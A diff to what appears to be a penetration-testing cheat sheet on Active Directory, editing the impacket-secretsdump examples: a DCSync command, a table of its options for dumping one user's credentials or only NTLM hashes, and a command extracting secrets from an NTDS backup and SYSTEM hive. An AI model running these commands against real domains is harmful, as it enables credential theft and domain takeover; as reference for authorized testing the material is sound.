@@ -88,9 +88,14 @@ If the error `KRB_AP_ERR_SKEW(Clock skew too great)` is thrown, synchronize the 
 
 **Example - dcsync attack:**
 
-`impacket-secretsdump -just-dc-user <target_user> <domain>/<user>:<password>@<ip>`
+`impacket-secretsdump  <domain>/<user>:<password>@<ip>`
 
-**Example - extract secrets from shadow copy:**
+| Option                        | Purpose                                      |
+| ----------------------------- | -------------------------------------------- |
+| `-just-dc-user <target_user>` | just credentials data of one user            |
+| `-just-dc-ntlm`               | only dump ntlm hashes, i.e. no kerberos keys |
+
+**Example - extract secrets from local shadow copy:**
 
 `impacket-secretsdump -ntds <ntds_backup> -system <system_hive_backup> LOCAL`
 
